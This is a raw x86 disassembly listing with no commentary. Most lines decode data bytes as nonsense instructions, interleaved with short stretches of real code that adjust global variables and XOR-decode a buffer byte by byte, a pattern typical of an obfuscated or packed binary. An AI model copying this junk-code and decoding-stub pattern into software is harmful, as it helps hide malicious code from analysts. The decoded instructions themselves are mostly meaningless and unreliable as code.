  4061f6:	pop    edx
  4061f7:	cmp    BYTE PTR [edi],dh
  4061f9:	bound  edx,QWORD PTR [ebx]
  4061fb:	jns    0x406256
  4061fd:	fstp   st(2)
  4061ff:	jmp    0x4061fe
  406201:	inc    ebx
  406202:	jb     0x40626d
  406204:	xor    DWORD PTR [eax+0x9],edi
  406207:	cmp    DWORD PTR [ebp+0x374ce362],edi
  40620d:	rcl    ah,0xe4
  406210:	lds    eax,FWORD PTR [edx+0x77be4070]
  406216:	push   0xffffffaa
  406218:	jne    0x4061f1
  40621a:	in     eax,0xe9
  40621c:	mov    cl,0x10
  40621e:	inc    ebp
  40621f:	xchg   DWORD PTR [edi+0x3a],ebp
  406222:	mov    dh,0x5c
  406224:	cdq    
  406225:	pop    esi
  406226:	js     0x4061ea
  406228:	ja     0x4061d4
  40622a:	mov    ds:0x4006c576,eax
  40622f:	repnz int3 
  406231:	mov    edi,0x38b08d4c
  406236:	sahf   
  406237:	sub    BYTE PTR [edi+edi*4-0x5c],ah
  40623b:	cmp    cl,ch
  40623d:	std    
  40623e:	jns    0x40625b
  406240:	imul   DWORD PTR [ecx+0x54]
  406243:	test   al,0x4a
  406245:	bound  ebp,QWORD PTR [edi-0x40859868]
  40624b:	cdq    
  40624c:	js     0x40625f
  40624e:	xchg   BYTE PTR [esi],ah
  406250:	mov    edi,DWORD PTR [edx+0x7784f66b]
  406256:	sbb    DWORD PTR [edi],esp
  406258:	dec    esi
  406259:	xchg   DWORD PTR [edi],esp
  40625b:	sub    eax,0x966c9c6c
  406260:	out    dx,eax
  406261:	je     0x406262
  406263:	jbe    0x4062c5
  406265:	sub    DWORD PTR [edi],edx
  406267:	rcl    ecx,cl
  406269:	icebp  
  40626a:	sbb    al,0x3e
  40626c:	sub    DWORD PTR [eax+eiz*8-0x43e87a4a],0x1d27057
  406277:	in     eax,dx
  406278:	ds inc ebx
  40627a:	xor    ebx,DWORD PTR [edi-0x112eea4b]
  406280:	jae    0x4062c7
  406282:	add    al,0x88
  406284:	xor    edx,DWORD PTR [ecx-0x235e2438]
  40628a:	ja     0x406278
  40628c:	xchg   edx,eax
  40628d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40628e:	cmc    
  40628f:	loop   0x40623a
  406291:	ins    DWORD PTR es:[edi],dx
  406292:	mov    eax,DWORD PTR [ebp-0x20]
  406295:	add    DWORD PTR ds:0x42f624,ebx
  40629b:	jmp    0x406373
  4062a0:	fstp   TBYTE PTR [eax+eax*8]
  4062a3:	inc    ebp
  4062a4:	out    0xfd,eax
  4062a6:	fistp  QWORD PTR [esi+0x1c590a69]
  4062ac:	cmp    al,0xf6
  4062ae:	bound  edi,QWORD PTR [edi+0x31ac]
  4062b4:	mov    ebx,0x27000000
  4062b9:	aas    
  4062ba:	fistp  QWORD PTR [ebx-0x588c2158]
  4062c0:	mov    ecx,0x27638c2e
  4062c5:	outs   dx,DWORD PTR ds:[esi]
  4062c6:	sahf   
  4062c7:	xchg   dh,bl
  4062c9:	icebp  
  4062ca:	xchg   ebx,eax
  4062cb:	dec    ebp
  4062cc:	sbb    eax,DWORD PTR [esi]
  4062ce:	dec    esp
  4062cf:	aam    0xce
  4062d1:	mov    dh,0xc7
  4062d3:	jne    0x40632c
  4062d5:	mov    esi,0xb709a2f1
  4062da:	cmp    ch,BYTE PTR ds:0xdc56b42e
  4062e0:	pop    esi
  4062e1:	fnstenv [ebx]
  4062e3:	aad    0xa4
  4062e5:	xor    bl,ch
  4062e7:	xchg   edx,eax
  4062e8:	in     eax,dx
  4062e9:	inc    edi
  4062ea:	add    al,0x81
  4062ec:	pop    ebp
  4062ed:	jle    0x40633f
  4062ef:	lock hlt 
  4062f1:	(bad)  [esi-0x37d804f3]
  4062f7:	std    
  4062f8:	ret    
  4062f9:	xchg   esi,edi
  4062fb:	(bad)  
  4062fc:	int    0xf6
  4062fe:	or     DWORD PTR [ebx-0xa1818ac],ebp
  406304:	dec    esp
  406305:	or     al,0x64
  406307:	jbe    0x406321
  406309:	add    DWORD PTR ss:[eax-0x4d],0x2f461311
  406311:	out    dx,al
  406312:	mov    ds:0x737f01d4,al
  406317:	lds    eax,FWORD PTR [edx-0x20c29e51]
  40631d:	push   esi
  40631e:	or     BYTE PTR [edx+0x2d],ah
  406321:	push   edi
  406322:	out    dx,al
  406323:	imul   edx,DWORD PTR es:[esi],0xffffffd2
  406327:	repz adc al,0x28
  40632a:	mov    eax,DWORD PTR [edi]
  40632c:	outs   dx,DWORD PTR ds:[esi]
  40632d:	lahf   
  40632e:	mov    bh,cl
  406330:	ret    0x62c0
  406333:	sbb    bh,BYTE PTR [edx+0x56997302]
  406339:	shl    DWORD PTR [ebx-0x19fb79be],cl
  40633f:	add    eax,0x38b45f02
  406344:	mov    ah,0xf3
  406346:	cld    
  406347:	dec    esp
  406348:	adc    eax,esp
  40634a:	xor    al,BYTE PTR [ebp-0x8]
  40634d:	call   0x87e2c74b
  406352:	loopne 0x40636c
  406354:	lea    ebp,[edx+0x1f]
  406357:	adc    eax,0x1a3d5f6a
  40635c:	aam    0x7f
  40635e:	sahf   
  40635f:	xchg   DWORD PTR [eax-0x3a],edx
  406362:	or     DWORD PTR [eax],0x6d9c3b1a
  406368:	push   ss
  406369:	jmp    0x4063c5
  40636b:	stc    
  40636c:	or     esp,edx
  40636e:	aas    
  40636f:	mov    bl,0xee
  406371:	(bad)  
  406372:	push   0xe9e4558b
  406377:	rol    DWORD PTR [eax],cl
  406379:	add    BYTE PTR [eax],al
  40637b:	iret   
  40637c:	ins    BYTE PTR es:[edi],dx
  40637d:	lds    ecx,FWORD PTR [esi]
  40637f:	out    0xaf,eax
  406381:	iret   
  406382:	in     eax,dx
  406383:	mov    edx,ebx
  406385:	adc    ecx,DWORD PTR ds:0x3fe1c89b
  40638b:	xor    al,BYTE PTR [bx+si]
  40638e:	add    BYTE PTR [ebx-0x1c000000],bh
  406394:	sub    dl,0x1c
  406397:	fisttp WORD PTR [esi+0xce54c6]
  40639d:	mov    esp,0xa70d0edd
  4063a2:	jnp    0x406351
  4063a4:	or     al,0xdd
  4063a6:	adc    dh,BYTE PTR [ecx]
  4063a8:	sahf   
  4063a9:	mov    ch,0x99
  4063ab:	sub    ecx,0x3fedd768
  4063b1:	push   ebx
  4063b2:	jg     0x40639b
  4063b4:	mov    dl,0x99
  4063b6:	push   edi
  4063b7:	stos   DWORD PTR es:[edi],eax
  4063b8:	push   ss
  4063b9:	mov    bh,0xd3
  4063bb:	hlt    
  4063bc:	(bad)  
  4063be:	call   0xb12a:0x85884d5c
  4063c5:	cmp    eax,0xc2a4678a
  4063ca:	mov    eax,0x1061ad3f
  4063cf:	(bad)  
  4063d0:	fdivr  DWORD PTR [eax+0x4]
  4063d3:	ret    
  4063d4:	dec    eax
  4063d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063d6:	std    
  4063d7:	shl    esp,cl
  4063d9:	int3   
  4063da:	(bad)  
  4063db:	shr    DWORD PTR [eax-0x9],1
  4063de:	pop    edi
  4063df:	or     al,0x18
  4063e1:	pop    ebx
  4063e2:	test   eax,0x409368b9
  4063e7:	push   ebx
  4063e8:	mov    al,ds:0x7a3a6d47
  4063ed:	cmp    dh,BYTE PTR [eax]
  4063ef:	add    ecx,DWORD PTR [ebx+0x74355bc8]
  4063f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063f6:	pop    edi
  4063f7:	push   0x241c948c
  4063fc:	pushf  
  4063fd:	test   bl,dl
  4063ff:	icebp  
  406400:	xlat   BYTE PTR ds:[ebx]
  406401:	push   ds
  406402:	jmp    0x40b9f33
  406407:	sbb    ecx,ebx
  406409:	and    al,0x8b
  40640b:	test   DWORD PTR [ebx+edi*8+0x44],eax
  40640f:	int    0xb8
  406411:	call   0x9d69:0xbc325125
  406418:	imul   ebp,DWORD PTR [edx],0x7d6bdc66
  40641e:	int3   
  40641f:	(bad)  
  406420:	(bad)  
  406421:	sbb    al,0xdb
  406423:	fwait
  406424:	cmp    edi,ebx
  406426:	pop    edi
  406427:	ret    0x2b09
  40642a:	outs   dx,BYTE PTR ds:[esi]
  40642b:	ret    
  40642c:	mov    bl,0x6e
  40642e:	adc    bl,0xf3
  406431:	mov    al,0xd4
  406433:	mov    ds:0xe3fd697a,eax
  406438:	sti    
  406439:	jle    0x4064b2
  40643b:	imul   ebp,DWORD PTR [edx+0x74],0x8ca102b2
  406442:	pop    ebx
  406443:	(bad)  
  406444:	wrmsr  
  406446:	inc    BYTE PTR [ecx+ebx*2+0x20]
  40644a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40644b:	or     al,0x49
  40644d:	cmp    dh,BYTE PTR [ebx]
  40644f:	(bad)  
  406450:	movzx  edx,WORD PTR ds:0x42f564
  406457:	sub    edx,DWORD PTR ds:0x42f63c
  40645d:	mov    DWORD PTR ds:0x42f564,edx
  406463:	lea    eax,[ebp+eax*1-0x66479db7]
  40646a:	mov    edx,DWORD PTR ds:0x42f5b4
  406470:	add    edx,DWORD PTR ds:0x42f5d0
  406476:	mov    DWORD PTR ds:0x42f5b4,edx
  40647c:	jmp    0x406554
  406481:	lods   eax,DWORD PTR ds:[esi]
  406482:	sub    ch,BYTE PTR [edi]
  406484:	dec    edi
  406485:	scas   eax,DWORD PTR es:[edi]
  406486:	dec    edi
  406487:	in     eax,dx
  406488:	jmp    0xd185:0xd5051fb
  40648f:	xchg   DWORD PTR [eax+0x22],esi
  406492:	xor    eax,DWORD PTR [eax]
  406494:	add    BYTE PTR [ebx+0x26000000],bh
  40649a:	(bad)  
  40649b:	test   eax,0x6e1ce9eb
  4064a0:	popa   
  4064a1:	mov    al,ds:0xc0fe95d2
  4064a6:	add    al,0x6c
  4064a8:	mov    ah,0x66
  4064aa:	pop    ecx
  4064ab:	into   
  4064ac:	pop    eax
  4064ad:	les    edi,FWORD PTR [esi-0xea887a2]
  4064b3:	jp     0x40644c
  4064b5:	repnz (bad) 
  4064b7:	scas   eax,DWORD PTR es:[edi]
  4064b8:	xchg   ebx,eax
  4064b9:	imul   esi,DWORD PTR ds:0x238d5911,0xaf331742
  4064c3:	dec    ebx
  4064c4:	mov    eax,0xf3731464
  4064c9:	fucomp st(2)
  4064cb:	mov    DWORD PTR ds:0x817e9bd5,0x2ffb65f3
  4064d5:	cmp    cl,BYTE PTR [edi+0x2346c240]
  4064db:	cmp    BYTE PTR [edx+0x1aa58402],dh
  4064e1:	into   
  4064e2:	add    BYTE PTR [ebx+0x57],0x5e
  4064e6:	in     eax,dx
  4064e7:	aam    0xa2
  4064e9:	xor    BYTE PTR [esi-0x11517921],cl
  4064ef:	and    DWORD PTR [ecx+eax*8],esp
  4064f2:	test   DWORD PTR [ebx],0xcabcb3ba
  4064f8:	pusha  
  4064f9:	mov    bl,0x43
  4064fb:	repnz xchg edi,eax
  4064fd:	pop    esi
  4064fe:	xchg   ecx,eax
  4064ff:	jl     0x406482
  406501:	jg     0x4064c9
  406503:	jnp    0x4064c6
  406505:	xor    edi,edx
  406507:	jo     0x4064db
  406509:	out    dx,eax
  40650a:	jmp    0x361a9432
  40650f:	mov    esp,0x8a4685da
  406514:	push   0x37
  406516:	mov    bl,0x20
  406518:	ja     0x40655e
  40651a:	dec    esi
  40651b:	pop    es
  40651c:	xor    BYTE PTR [eax],dh
  40651e:	pop    edi
  40651f:	ja     0x4064ac
  406521:	jmp    0x406565
  406523:	mov    eax,0xf3e8ea34
  406528:	mov    cl,0x9d
  40652a:	fadd   QWORD PTR [edx-0x71]
  40652d:	mov    si,0xb2c8
  406531:	call   0xf2eb:0x6f454e7e
  406538:	ret    
  406539:	adc    BYTE PTR ds:0xc0b04b39,al
  40653f:	xor    eax,DWORD PTR [ecx]
  406541:	pop    ebp
  406542:	mov    BYTE PTR [edx-0x53],bl
  406545:	ins    DWORD PTR es:[edi],dx
  406546:	pop    ebx
  406547:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406548:	mov    ch,0x47
  40654a:	pop    ss
  40654b:	push   esp
  40654c:	lds    ebp,FWORD PTR [edi]
  40654e:	out    dx,al
  40654f:	add    BYTE PTR ds:0x893b14c8,ch
  406555:	inc    ebp
  406556:	adc    BYTE PTR [ebx+0x558be045],cl
  40655c:	in     al,0xe9
  40655e:	rol    DWORD PTR [eax],cl
  406560:	add    BYTE PTR [eax],al
  406562:	xchg   ecx,eax
  406563:	pop    ecx
  406564:	sbb    eax,0xb57ddd39
  406569:	stc    
  40656a:	mov    edi,DWORD PTR [esi]
  40656c:	dec    eax
  40656d:	in     al,0xb
  40656f:	sbb    ebp,eax
  406571:	xchg   edx,eax
  406572:	fnsave [ebx]
  406574:	add    BYTE PTR [eax],al
  406576:	mov    ebx,0x3f000000
  40657b:	test   eax,0x77f0a5f8
  406580:	lods   eax,DWORD PTR ds:[esi]
  406581:	out    dx,al
  406582:	or     eax,0x8e0927d6
  406587:	imul   esi,DWORD PTR [esi+edi*4+0x61],0x6b
  40658c:	aas    
  40658d:	xchg   esp,eax
  40658e:	add    al,0x1
  406590:	les    ecx,FWORD PTR [eax-0x4818ec86]
  406596:	stos   BYTE PTR es:[edi],al
  406597:	shl    DWORD PTR [edx+0x4d],0x4f
  40659b:	mov    dh,0xb5
  40659d:	addr16 pop edx
  40659f:	outs   dx,BYTE PTR ds:[esi]
  4065a0:	xchg   esp,eax
  4065a1:	lea    ecx,ds:0xa21dbd1b
  4065a7:	fs pusha 
  4065a9:	pusha  
  4065aa:	add    eax,0xf60e03bd
  4065af:	dec    edi
  4065b0:	popa   
  4065b1:	aas    
  4065b2:	retf   
  4065b3:	inc    ebx
  4065b4:	adc    DWORD PTR [edx+0x75],edx
  4065b7:	test   al,0xde
  4065b9:	xchg   ebx,eax
  4065ba:	mov    edx,0x58c731c2
  4065bf:	loope  0x406615
  4065c1:	push   edx
  4065c2:	push   edi
  4065c3:	outs   dx,DWORD PTR ds:[esi]
  4065c4:	pop    edx
  4065c5:	mov    esp,DWORD PTR [esi]
  4065c7:	cli    
  4065c8:	data16 cmp dl,ch
  4065cb:	xchg   ecx,eax
  4065cc:	shl    BYTE PTR [esi+ebp*4],1
  4065cf:	int    0xf
  4065d1:	enter  0x77c2,0xf3
  4065d5:	cmp    ch,BYTE PTR [eax+0x16]
  4065d8:	push   ebx
  4065d9:	jg     0x4065a2
  4065db:	fisttp QWORD PTR [ebx-0x25869b0d]
  4065e1:	mov    ah,0x5b
  4065e3:	push   edx
  4065e4:	fs sub eax,0x8444aa08
  4065ea:	xchg   edx,eax
  4065eb:	shr    DWORD PTR [ebx+0x3277fc09],1
  4065f1:	add    edi,DWORD PTR [edx-0x73]
  4065f4:	push   ebp
  4065f5:	(bad)  
  4065f6:	jp     0x406672
  4065f8:	push   ss
  4065f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065fa:	xchg   DWORD PTR [ebx],esi
  4065fc:	int    0x0
  4065fe:	jmp    0x4065c6
  406600:	mov    ebx,0x84238426
  406605:	sbb    DWORD PTR [ebx],ebp
  406607:	add    al,0xbc
  406609:	inc    eax
  40660a:	and    dl,BYTE PTR [eax]
  40660c:	xchg   ebp,eax
  40660d:	sbb    ch,ah
  40660f:	aas    
  406610:	xchg   esp,eax
  406611:	mov    ds:0xd77650c3,al
  406616:	loopne 0x4065d0
  406618:	shr    BYTE PTR [edi+0x2c],0x85
  40661c:	pop    edi
  40661d:	ins    DWORD PTR es:[edi],dx
  40661e:	mov    ebx,0xd742ef38
  406623:	stos   BYTE PTR es:[edi],al
  406624:	xor    BYTE PTR [eax-0xd254867],0xf8
  40662b:	loope  0x406605
  40662d:	mov    dl,0xaa
  40662f:	jnp    0x406676
  406631:	push   ebp
  406632:	out    0x1b,al
  406634:	pop    ds
  406635:	mov    edx,DWORD PTR [ebp-0x8]
  406638:	xor    eax,esi
  40663a:	or     DWORD PTR ds:0x42f648,0x74e3
  406644:	jmp    0x40671c
  406649:	test   al,0x12
  40664b:	fild   QWORD PTR [eax-0x1]
  40664e:	in     eax,dx
  40664f:	mov    edi,0x6000d3d2
  406654:	in     al,0xd
  406656:	adc    al,0xb9
  406658:	jo     0x4065f2
  40665a:	xor    al,0x0
  40665c:	add    BYTE PTR [ebx-0x53000000],bh
  406662:	shr    BYTE PTR [ebx+eax*8+0x64],cl
  406666:	xlat   BYTE PTR ds:[ebx]
  406667:	(bad)  
  406669:	mov    edx,0x63115c49
  40666e:	pop    edi
  40666f:	jb     0x40668f
  406671:	xchg   ecx,eax
  406672:	(bad)  
  406673:	mov    ebp,0x7fec8ca8
  406678:	lods   al,BYTE PTR ds:[esi]
  406679:	add    DWORD PTR [ecx],esi
  40667b:	xor    al,0x85
  40667e:	inc    esi
  40667f:	test   DWORD PTR [eax],esp
  406681:	mov    eax,ds:0x79fb9222
  406686:	jp     0x4066c0
  406688:	mov    edi,0xf1a3710e
  40668d:	ror    DWORD PTR [esi+0x14117867],cl
  406693:	ret    0x2247
  406696:	sub    eax,ebx
  406698:	xor    ebp,DWORD PTR es:[edi+0x79]
  40669c:	sub    BYTE PTR [ebp+0x34876c8f],bh
  4066a2:	sbb    bh,ah
  4066a4:	je     0x406710
  4066a6:	ja     0x4066f7
  4066a8:	push   0x6b
  4066aa:	call   0xd6a6e4c5
  4066af:	and    ah,BYTE PTR [edi-0x4f]
  4066b2:	bound  ebp,QWORD PTR [esp]
  4066b5:	or     DWORD PTR [ebx-0x460d9a47],ecx
  4066bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066bc:	ja     0x4066cd
  4066be:	je     0x406648
  4066c0:	push   0xffffffdd
  4066c2:	adc    eax,0x1f20f56d
  4066c7:	out    0x5b,eax
  4066c9:	fnstenv [ebx]
  4066cb:	jg     0x4066b5
  4066cd:	mov    ah,BYTE PTR [eax+ecx*8+0x73]
  4066d1:	push   ss
  4066d2:	push   eax
  4066d3:	dec    esi
  4066d4:	mov    dl,BYTE PTR [eax-0x54]
  4066d7:	pop    ebx
  4066d8:	ficom  WORD PTR [ebp-0x3836e11b]
  4066de:	ins    BYTE PTR es:[edi],dx
  4066df:	out    dx,eax
  4066e0:	out    0x28,al
  4066e2:	jb     0x40671f
  4066e4:	popf   
  4066e5:	push   0x559c012f
  4066ea:	mov    BYTE PTR [eax+0x7b],al
  4066ed:	scas   eax,DWORD PTR es:[edi]
  4066ee:	mov    cl,0xd5
  4066f0:	repz int3 
  4066f2:	loope  0x4066d8
  4066f4:	imul   ecx,ebp,0x81f432c2
  4066fa:	leave  
  4066fb:	xlat   BYTE PTR ds:[ebx]
  4066fc:	les    ebx,FWORD PTR [ebp+0x69f21202]
  406702:	jnp    0x406756
  406704:	xchg   ebx,eax
  406705:	jg     0x40674b
  406707:	push   edi
  406708:	sahf   
  406709:	xor    bl,BYTE PTR [ebx]
  40670b:	and    BYTE PTR [ecx-0x15fc1236],ch
  406711:	xor    eax,0x4ac64409
  406716:	dec    ecx
  406717:	icebp  
  406718:	and    al,0x40
  40671a:	sar    DWORD PTR [ecx-0x76],0x94
  40671e:	adc    BYTE PTR [ebp+0x62],cl
  406721:	mov    eax,0xf604a199
  406726:	inc    edx
  406727:	add    BYTE PTR [ecx],dh
  406729:	add    eax,0x42f5d8
  40672e:	mov    eax,DWORD PTR [ebp+0x10]
  406731:	sbb    DWORD PTR ds:0x42f620,0x6aa6
  40673b:	xor    BYTE PTR [eax],dl
  40673d:	cmp    DWORD PTR ds:0x42f650,0x0
  406744:	jbe    0x40683c
  40674a:	sub    DWORD PTR ds:0x42f64c,0x3181
  406754:	jmp    0x40683c
  406759:	push   0x4670
  40675e:	call   DWORD PTR ds:0x438800
  406764:	jmp    0x40683c
  406769:	xor    bh,BYTE PTR [ebp+0x37]
  40676c:	dec    edx
  40676d:	jg     0x4067b9
  40676f:	jg     0x4067ee
  406771:	lahf   
  406772:	outs   dx,BYTE PTR ds:[esi]
  406773:	xor    DWORD PTR [esi+edx*2+0x536d4a32],edi
  40677a:	xor    eax,0xbb0000
  40677f:	add    BYTE PTR [eax],al
  406781:	out    dx,eax
  406782:	in     al,dx
  406783:	fstp   QWORD PTR [edi]
  406785:	arpl   di,cx
  406787:	rol    ebp,cl
  406789:	jp     0x406768
  40678b:	js     0x4067a5
  40678d:	mov    eax,ds:0x7b2d4b3a
  406792:	lds    eax,FWORD PTR [ebp-0x51]
  406795:	pop    ecx
  406796:	push   edx
  406797:	cdq    
  406798:	ins    DWORD PTR es:[edi],dx
  406799:	adc    eax,0xea6d2335
  40679e:	inc    esp
  40679f:	inc    ebp
  4067a0:	scas   eax,DWORD PTR es:[edi]
  4067a1:	adc    BYTE PTR [edx+0x65de2970],dl
  4067a7:	out    0xf8,eax
  4067a9:	pop    es
  4067aa:	and    al,dl
  4067ac:	sahf   
  4067ad:	mov    ecx,0x45c40de1
  4067b2:	sar    BYTE PTR [edx+0x5f],cl
  4067b5:	mov    ebp,0x2b79ac36
  4067ba:	sub    eax,0x4981179f
  4067bf:	pop    ds
  4067c0:	jmp    0x4d52bf59
  4067c5:	push   edi
  4067c6:	outs   dx,BYTE PTR ds:[esi]
  4067c7:	push   ds
  4067c8:	mov    eax,ds:0x4b470e09
  4067cd:	mov    bh,0xcf
  4067cf:	mov    bl,BYTE PTR [ebp-0x9]
  4067d2:	jge    0x4067a6
  4067d4:	mov    dh,0xc7
  4067d6:	pushf  
  4067d7:	cs xchg esp,eax
  4067d9:	push   ss
  4067da:	cdq    
  4067db:	push   ebp
  4067dc:	pop    esi
  4067dd:	loop   0x406852
  4067df:	adc    BYTE PTR [ebx],cl
  4067e1:	into   
  4067e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067e3:	fcom   st(4)
  4067e5:	push   esp
  4067e6:	jne    0x4067f1
  4067e8:	ds mov esi,0xbca9f767
  4067ee:	je     0x4067f8
  4067f0:	jl     0x4067d3
  4067f2:	add    al,0xb3
  4067f4:	xor    al,0x55
  4067f6:	sub    al,0xce
  4067f8:	push   cs
  4067f9:	test   eax,0xb3a28e7e
  4067fe:	fistp  WORD PTR [eax+edi*1]
  406801:	add    DWORD PTR [esi+0xd0eccfb],ebp
  406807:	aas    
  406808:	push   es
  406809:	lea    ecx,[ecx-0x60]
  40680c:	mov    ecx,0x1f44559a
  406811:	inc    eax
  406812:	lahf   
  406813:	sub    edi,ebx
  406815:	dec    eax
  406816:	mov    esp,0x723e2359
  40681b:	jmp    0x4067df
  40681d:	lock mov al,0x63
  406820:	test   al,0x4a
  406822:	add    edx,DWORD PTR [eax]
  406824:	(bad)  
  406825:	xchg   esp,eax
  406826:	pop    edx
  406827:	jne    0x40685e
  406829:	call   0x37dc:0xf96d2413
  406830:	adc    BYTE PTR [edi+0x6d],al
  406833:	out    dx,eax
  406834:	bound  ecx,QWORD PTR [edx+0x49]
  406837:	cmp    BYTE PTR [ecx],0xe
  40683a:	pop    ecx
  40683b:	sub    eax,0x8be8458b
  406840:	push   ebp
  406841:	in     al,dx
  406842:	jmp    0x40691a
  406847:	call   0x9ed3:0xcd8284d7
  40684e:	fbstp  TBYTE PTR [ebx]
  406850:	cmp    eax,0x6dd560a5
  406855:	sar    BYTE PTR [edi+0x360e],cl
  40685b:	mov    ebx,0xf0000000
  406860:	aas    
  406861:	in     eax,dx
  406862:	sbb    ebx,edx
  406864:	mov    dl,0x58
  406866:	sub    bl,BYTE PTR [ecx+0x59ae1090]
  40686c:	jmp    0x406838
  40686e:	sar    cl,1
  406870:	aas    
  406871:	sub    dh,BYTE PTR [edi+0x6b]
  406874:	add    al,0x9a
  406876:	ror    DWORD PTR [edx],1
  406878:	adc    eax,0xd41ea715
  40687d:	and    BYTE PTR [edx],ah
  40687f:	outs   dx,DWORD PTR ds:[esi]
  406880:	mov    eax,0xce3d5a12
  406885:	cwde   
  406886:	dec    edi
  406887:	mov    ds:0xb9005fce,eax
  40688c:	cli    
  40688d:	jns    0x4068df
  40688f:	out    dx,eax
  406890:	dec    eax
  406891:	push   0x68d196bc
  406896:	cmp    al,BYTE PTR [ecx+edx*8-0x28]
  40689a:	std    
  40689b:	rcl    DWORD PTR [ebx-0x53],0x7
  40689f:	dec    esi
  4068a0:	shr    BYTE PTR [edi],1
  4068a2:	jle    0x406835
  4068a4:	imul   ebx,edx,0x33
  4068a7:	ror    DWORD PTR ds:0xd97ee1e0,cl
  4068ad:	aam    0xe6
  4068af:	or     eax,0xa3f714f1
  4068b4:	mov    ah,0x3f
  4068b6:	int3   
  4068b7:	jmp    0xd15cf260
  4068bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068bd:	cmp    BYTE PTR ds:0xb881a454,bl
  4068c3:	js     0x40692b
  4068c5:	dec    ecx
  4068c6:	sti    
  4068c7:	lds    ecx,FWORD PTR [edx-0x3c3d1c78]
  4068cd:	pusha  
  4068ce:	js     0x4068cf
  4068d0:	pusha  
  4068d1:	adc    bh,BYTE PTR [esi+eax*4+0x619e9027]
  4068d8:	xor    eax,0xcbde893
  4068dd:	add    eax,DWORD PTR [eax+0x1f]
  4068e0:	sar    bh,0x65
  4068e3:	jne    0x40688d
  4068e5:	scas   al,BYTE PTR es:[edi]
  4068e6:	je     0x4068ec
  4068e8:	div    edi
  4068ea:	sub    eax,0xbd4e1d5b
  4068ef:	or     eax,0x7a91fdf9
  4068f4:	ja     0x406958
  4068f6:	jecxz  0x406914
  4068f8:	xchg   edx,eax
  4068f9:	mov    edi,0xe9123ede
  4068fe:	pop    ds
  4068ff:	test   ah,al
  406901:	inc    edi
  406902:	(bad)  
  406903:	push   ss
  406904:	cli    
  406905:	(bad)  [ebx]
  406907:	data16 (bad) 
  406909:	cs sub bh,al
  40690c:	pusha  
  40690d:	jae    0x4068dc
  40690f:	in     al,dx
  406910:	stos   BYTE PTR es:[edi],al
  406911:	mov    ah,0x8f
  406913:	retf   
  406914:	add    DWORD PTR [eax-0x226ced39],ebp
  40691a:	xor    eax,esi
  40691c:	jmp    0x4069f4
  406921:	jae    0x4068af
  406923:	sub    edi,0x9c7fefff
  406929:	inc    esp
  40692a:	fwait
  40692b:	xchg   ebx,eax
  40692c:	les    edx,FWORD PTR [eax-0x365eccdb]
  406932:	add    BYTE PTR ss:[eax],al
  406935:	mov    ebx,0x1a000000
  40693a:	stos   BYTE PTR es:[edi],al
  40693b:	out    dx,al
  40693c:	test   eax,0xea23e8a3
  406941:	jno    0x406952
  406943:	adc    al,0x4f
  406945:	cli    
  406946:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406947:	mov    bl,0x68
  406949:	pop    eax
  40694a:	push   0xfbf6d4ae
  40694f:	jmp    0x4068d5
  406951:	or     ecx,DWORD PTR [ebx+0x12]
  406954:	xor    eax,0xff905527
  406959:	dec    esp
  40695a:	out    0x8,eax
  40695c:	hlt    
  40695d:	clc    
  40695e:	jle    0x40692f
  406960:	adc    BYTE PTR [ebp-0x29],0x64
  406964:	aas    
  406965:	sub    BYTE PTR [ecx-0x5c605756],ah
  40696b:	mov    eax,ds:0xb88de271
  406970:	aam    0xb3
  406972:	jae    0x40690a
  406974:	out    dx,al
  406975:	xchg   ebp,eax
  406976:	daa    
  406977:	and    bl,BYTE PTR [edi-0x4d43f501]
  40697d:	xor    edi,DWORD PTR [edi]
  40697f:	xor    BYTE PTR ds:0x39cc3a47,0x50
  406986:	sti    
  406987:	pop    edx
  406988:	(bad)  
  406989:	mov    esi,0x5098a30f
  40698e:	sub    DWORD PTR [edx],esp
  406990:	cmp    ebx,DWORD PTR [ebp+0x6f9c9207]
  406996:	shr    DWORD PTR [ecx-0x6b],1
  406999:	leave  
  40699a:	mov    ss,WORD PTR [ebp-0x1d]
  40699d:	mov    dl,0xcb
  40699f:	xor    BYTE PTR [ebx-0x21],0x52
  4069a3:	xor    ah,BYTE PTR [ebp-0x3c]
  4069a6:	dec    eax
  4069a7:	inc    eax
  4069a8:	push   esp
  4069a9:	int    0xd0
  4069ab:	pop    ebx
  4069ac:	adc    dh,cl
  4069ae:	les    edi,FWORD PTR [edx-0x2a9bd181]
  4069b4:	cdq    
  4069b5:	out    dx,al
  4069b6:	sub    ah,BYTE PTR [edx]
  4069b8:	mov    edx,DWORD PTR [edi-0xec4cdaa]
  4069be:	xchg   edi,eax
  4069bf:	mov    ebp,0xb09705d9
  4069c4:	aam    0x98
  4069c6:	into   
  4069c7:	dec    BYTE PTR [esi+0x40c4e79]
  4069cd:	sbb    BYTE PTR [eax-0x4e3a1ea4],cl
  4069d3:	cmp    BYTE PTR [ebp+eiz*2+0x36fe8d2c],0x7d
  4069db:	mov    cl,0xc8
  4069dd:	jno    0x406963
  4069df:	mov    cl,0x77
  4069e1:	push   ebp
  4069e2:	push   ebp
  4069e3:	push   ecx
  4069e4:	dec    ecx
  4069e5:	add    al,0x4b
  4069e7:	rcl    DWORD PTR [edx],1
  4069e9:	aaa    
  4069ea:	cdq    
  4069eb:	jg     0x40699a
  4069ed:	fimul  WORD PTR [eax+edx*8-0x363b31da]
  4069f4:	lea    eax,[ebp+eax*1-0x66479db7]
  4069fb:	mov    DWORD PTR [ebp+0x10],eax
  4069fe:	mov    eax,DWORD PTR [ebp-0x18]
  406a01:	and    edx,0x55e7
  406a07:	mov    edx,DWORD PTR [ebp-0x14]
  406a0a:	or     DWORD PTR ds:0x42f580,0x644b
  406a14:	mov    edx,DWORD PTR [ebp-0x8]
  406a17:	sub    DWORD PTR ds:0x42f55c,0x42f57c
  406a21:	xor    eax,esi
  406a23:	mov    dl,BYTE PTR [eax+edx*1-0x66479db3]
  406a2a:	mov    eax,DWORD PTR [ebp+0x10]
  406a2d:	xor    BYTE PTR [eax],dl
  406a2f:	mov    eax,DWORD PTR [ebp+0x18]
  406a32:	jmp    0x406b0a
